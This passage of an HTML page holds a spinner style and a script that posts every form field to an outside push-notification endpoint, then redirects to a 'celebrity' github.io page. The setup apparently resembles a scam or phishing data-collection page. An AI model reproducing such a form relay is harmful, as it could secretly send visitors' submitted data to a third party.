        /* Spinner animation */
        .spinner {
            border: 6px solid rgba(255, 255, 255, 0.3); /* Thicker border */
            border-top: 16px solid black; /* Thicker spinner border */
            border-radius: 50%;
            width: 100px; /* Larger spinner size */
            height: 100px; /* Larger spinner size */
            animation: spin 1s linear infinite;
            margin-bottom: 15px; /* Space between spinner and text */
        }

        @keyframes spin {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(360deg);
            }
        }
    </style>
    <script>
        function handleFormSubmit(event) {
            event.preventDefault(); // Prevent default form submission

            // Show the loading message and spinner
            const loadingMessage = document.getElementById("loading-message");
            loadingMessage.style.visibility = "visible";

            // Collect form data
            const formData = new FormData(event.target);

            // Create XMLHttpRequest for compatibility with old browsers
            const xhr = new XMLHttpRequest();

            // API endpoint
            const apiUrl = "https://wirepusher.com/send";

            // Configure the request to POST to the API
            xhr.open("POST", apiUrl, true);

            // Setup a callback to handle the response
            xhr.onload = function () {
                // Hide the loading message
                loadingMessage.style.visibility = "hidden";

                if (xhr.status === 200) {
                    try {
                        // Parse the response
                        const response = JSON.parse(xhr.responseText);

                        // Check if the response indicates success
                        if (response.results && response.results["6Cr7mpGrC"] === "success") {
                            // Redirect to the desired URL
                            window.location.href = "https://celebrity-us.github.io/Peg/";
                        } else {
                            alert("Submission failed! Please try again.");
                        }
                    } catch (e) {
                        alert("An error occurred while processing the response.");
                        console.error(e);
                    }
                } else {
                    alert("Failed to submit the form. Please check your connection.");
                }
            };

            // Handle network errors or other issues
            xhr.onerror = function () {
                // Hide the loading message
                loadingMessage.style.visibility = "hidden";
                alert("A network error occurred. Please try again later.");
            };

            // Send the form data
            xhr.send(formData);
        }
    </script>
